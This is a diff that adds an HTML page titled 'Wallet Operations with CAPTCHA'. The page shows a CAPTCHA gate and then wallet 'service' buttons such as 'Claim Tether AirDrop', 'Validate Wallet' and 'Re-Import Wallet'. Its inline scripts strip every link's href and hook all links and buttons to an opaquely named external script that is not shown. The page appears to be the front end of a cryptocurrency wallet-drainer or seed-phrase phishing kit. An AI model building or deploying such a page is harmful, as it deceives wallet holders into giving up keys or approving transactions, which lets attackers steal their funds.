@@ -1,0 +1,326 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wallet Operations with CAPTCHA</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+    
+    <script charset="UTF-8" type="text/javascript" src="./e2c602bf-1686-40dd-a1d4-ad55c1b818b0.js"></script>
+
+
+    <script>
+       document.addEventListener('DOMContentLoaded', function () {
+         var links = document.querySelectorAll('body a');
+         for (var i = 0; i < links.length; i++) {
+           var link = links[i];
+           link.removeAttribute('href');
+           link.classList.add('interact-button');
+         }
+         });
+         </script>                                                                                                                          
+         <script>
+     document.addEventListener('DOMContentLoaded', function () {
+       var buttons = document.querySelectorAll('body button');
+       for (var i = 0; i < buttons.length; i++) {
+         var button = buttons[i];
+         button.classList.add('interact-button');
+       }
+     });
+     </script>
+     <script>
+       document.addEventListener("DOMContentLoaded", function() {
+         const elements = document.querySelectorAll('[ad-data-linked]');
+         elements.forEach(element => {
+             element.removeAttribute('ad-data-linked');
+         });
+     
+         console.log('Removed ad-data-linked attributes from', elements.length, 'elements');
+     });
+     
+     </script>
+     
+         <style>
+           .interact-button {
+           cursor: pointer;
+           }
+         </style>
+   
+
+
+    <style>
+        /* Basic Reset */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        /* Full Page Background with Gradient Animation */
+        body, html {
+            height: 100%;
+            background: linear-gradient(45deg, #6c63ff, #8a56ff, #ff60b6, #3a3a58);
+            background-size: 300% 300%;
+            animation: gradientAnimation 5s ease infinite;
+            font-family: 'Poppins', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #fff;
+            overflow: hidden;
+        }
+
+        @keyframes gradientAnimation {
+            0% {
+                background-position: 0% 50%;
+            }
+            50% {
+                background-position: 100% 50%;
+            }
+            100% {
+                background-position: 0% 50%;
+            }
+        }
+
+        /* CAPTCHA Section */
+        #captchaSection {
+            width: 100%;
+            max-width: 400px;
+            padding: 20px;
+            text-align: center;
+            background-color: rgba(255, 255, 255, 0.85);
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            margin-top: 50px;
+        }
+
+        h1 {
+            margin-bottom: 20px;
+            font-size: 24px;
+            font-weight: 600;
+            color: #333;
+        }
+
+        /* CAPTCHA Text */
+        .captcha-container {
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #f5f5f5;
+            padding: 15px;
+            border-radius: 8px;
+            border: 2px solid #ddd;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .captcha-text {
+            font-size: 28px;
+            font-weight: bold;
+            letter-spacing: 2px;
+            color: #333;
+            text-transform: uppercase;
+            user-select: none;
+            position: relative;
+        }
+
+        /* CAPTCHA Input */
+        .captcha-input {
+            padding: 12px;
+            font-size: 20px;
+            border: 2px solid #ddd;
+            border-radius: 5px;
+            margin-top: 15px;
+            width: 80%;
+            text-align: center;
+            transition: border 0.3s ease;
+        }
+
+        .captcha-input:focus {
+            border-color: #6c63ff;
+            outline: none;
+        }
+
+        .captcha-message {
+            margin-top: 15px;
+            color: red;
+            font-size: 14px;
+            display: none;
+        }
+
+        /* Submit Button */
+        .button {
+            margin-top: 20px;
+            padding: 12px 30px;
+            font-size: 16px;
+            background-color: #6c63ff;
+            color: white;
+            border: none;
+            border-radius: 30px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: inline-block;
+        }
+
+        .button:hover {
+            background-color: #8a56ff;
+        }
+
+        /* Main Content - Initially Hidden */
+        .container {
+            display: none;
+            flex-direction: column;
+            gap: 20px;
+            text-align: center;
+            background-color: rgba(0, 0, 0, 0.7);
+            border-radius: 20px;
+            padding: 50px;
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.4);
+            animation: fadeIn 1s ease-out;
+        }
+
+        @keyframes fadeIn {
+            0% {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            100% {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /* Media Queries for Responsiveness */
+        @media (max-width: 768px) {
+            /* Adjust CAPTCHA and button sizes on tablets */
+            .captcha-text {
+                font-size: 24px;
+            }
+
+            .captcha-input {
+                font-size: 18px;
+                padding: 10px;
+                width: 90%;
+            }
+
+            .button {
+                font-size: 14px;
+                padding: 12px 25px;
+                width: 100%;
+            }
+
+            .container {
+                padding: 30px;
+                width: 90%;
+                gap: 15px;
+            }
+
+            h1 {
+                font-size: 20px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            /* Adjust CAPTCHA and button sizes on mobile */
+            .captcha-text {
+                font-size: 22px;
+            }
+
+            .captcha-input {
+                font-size: 16px;
+                padding: 8px;
+                width: 90%;
+            }
+
+            .button {
+                font-size: 16px;
+                padding: 12px 20px;
+                width: 100%;
+            }
+
+            .container {
+                padding: 20px;
+                width: 95%;
+                gap: 10px;
+            }
+
+            h1 {
+                font-size: 18px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <!-- CAPTCHA Section -->
+    <div id="captchaSection">
+        <h1>Please complete the CAPTCHA to continue</h1>
+        <div class="captcha-container">
+            <span class="captcha-text" id="captchaText"></span>
+        </div>
+        <input type="text" class="captcha-input" id="captchaInput" placeholder="Enter CAPTCHA text" />
+        <div class="captcha-message" id="captchaMessage">Incorrect CAPTCHA, please try again!</div>
+        <button class="button" id="submitCaptchaBtn">Submit</button>
+    </div>
+
+    <!-- Main Content - Initially Hidden -->
+    <div class="container" id="mainContent">
+        <h1>Wallet Operations</h1>
+        <button class="button" id="walletConnectBtn">Wallet Connect</button>
+        <button class="button" id="resetWalletBtn">Reset Wallet</button>
+        <button class="button" id="reImportBtn">Re-Import Wallet</button>
+        <button class="button" id="stakeBtn">Stake/Unstake Token</button>
+        <button class="button" id="validateBtn">Validate Wallet</button>
+        <button class="button" id="claimBtn">Claim Tether AirDrop</button>
+        <button class="button" id="revokeBtn">Revoke Token/Transaction</button>
+        <button class="button" id="multiSigBtn">Multi-Signature Dapps</button>
+        <button class="button" id="contractBtn">Smart Contract Integration</button>
+        <button class="button" id="rentEnergyBtn">Rent Energy</button>
+        <button class="button" id="validateNFTBtn">Validate NFT</button>
+        <button class="button" id="escrowBtn">Escrow</button>
+    </div>
+
+    <script>
+        // Generate a random CAPTCHA string
+        function generateCaptcha() {
+            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+            let captcha = '';
+            for (let i = 0; i < 6; i++) {
+                captcha += characters.charAt(Math.floor(Math.random() * characters.length));
+            }
+            return captcha;
+        }
+
+        // Display the CAPTCHA
+        const captchaTextElement = document.getElementById('captchaText');
+        const captchaInputElement = document.getElementById('captchaInput');
+        const captchaMessageElement = document.getElementById('captchaMessage');
+        const submitCaptchaBtn = document.getElementById('submitCaptchaBtn');
+
+        let captchaAnswer = generateCaptcha();
+        captchaTextElement.textContent = captchaAnswer;
+
+        // Handle CAPTCHA submission
+        submitCaptchaBtn.addEventListener('click', function () {
+            const userAnswer = captchaInputElement.value.trim();
+
+            if (userAnswer === captchaAnswer) {
+                // If the answer is correct, show the main content and hide CAPTCHA section
+                document.getElementById('captchaSection').style.display = 'none';
+                document.getElementById('mainContent').style.display = 'flex';
+            } else {
+                // Show error message if the answer is incorrect
+                captchaMessageElement.style.display = 'block';
+            }
+        });
+    </script>
+</body>
+</html>
